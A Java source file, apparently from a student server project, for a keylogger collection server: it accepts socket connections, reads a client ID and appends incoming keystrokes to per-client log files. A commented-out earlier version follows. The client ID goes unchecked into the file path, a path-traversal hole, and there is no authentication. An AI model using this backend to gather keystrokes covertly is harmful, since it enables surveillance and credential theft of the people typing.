package com.server.liveowl.Keylogger;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class ServerKeylogger implements Runnable {
    private static final int PORT = 12345;
    private static final String LOG_DIRECTORY = "D:/PBL4/LiveOwlServer/src/main/java/com/server/liveowl/Keylogger";
    public void run() {
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            System.out.println("ServerKeylogger đang lắng nghe ở cổng " + PORT);

            while (true) {
                Socket socket = serverSocket.accept();
                new Thread(() -> {
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
                        String clientID = reader.readLine();
                        try (FileWriter writer = new FileWriter(LOG_DIRECTORY + "/" + clientID + "_keylogs.txt", true)) {
                            String keyStroke;
                            while ((keyStroke = reader.readLine()) != null) {
                                writer.write(keyStroke + " ");
                                writer.flush();
                            }
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

//public class ServerKeylogger implements Runnable {
//    private static final int PORT = 12345;
//    private static final String LOG_DIRECTORY = "D:/PBL4/LiveOwlServer/src/main/java/com/server/liveowl/Keylogger"; // Đường dẫn lưu log tuyệt đối
//
//    public void run() {
//        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
//            System.out.println("ServerKeylogger đang lắng nghe ở cổng " + PORT);
//
//            // Kiểm tra và tạo thư mục nếu chưa tồn tại
//            File logDir = new File(LOG_DIRECTORY);
//            if (!logDir.exists()) {
//                logDir.mkdirs();
//            }
//
//            while (true) {
//                Socket socket = serverSocket.accept();
//                new Thread(() -> {
//                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
//                        String clientID = reader.readLine();
//                        try (FileWriter writer = new FileWriter(LOG_DIRECTORY + "/" + clientID + "_keylogs.txt", true)) {
//                            String keyStroke;
//                            while ((keyStroke = reader.readLine()) != null) {
//                                writer.write(keyStroke);
//                                writer.flush();
//                            }
//                        }
//                    } catch (IOException e) {
//                        e.printStackTrace();
//                    }
//                }).start();
//            }
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//    }
//}